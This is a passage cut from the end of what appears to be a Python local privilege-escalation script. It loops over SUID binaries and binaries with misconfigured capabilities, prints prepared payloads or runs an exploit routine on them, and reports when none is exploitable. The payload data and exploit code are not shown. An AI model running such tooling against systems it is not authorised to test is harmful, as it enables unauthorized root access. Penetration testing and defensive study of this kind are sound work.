                    print(f"[*] Found misconfigured capabilities on: {binary}")
                    print(f"    Payload: {prepare_payload(exploits['capabilities'][base_name]['code'], binary, base_name)}")
                else:
                    if exploit(exploits['capabilities'][base_name], binary, 'capabilities', base_name):
                        found = True
                        break

    if args.list and not suid_binaries and not cap_binaries:
        print("[-] No exploitable binaries found")

if __name__ == "__main__":
    main()
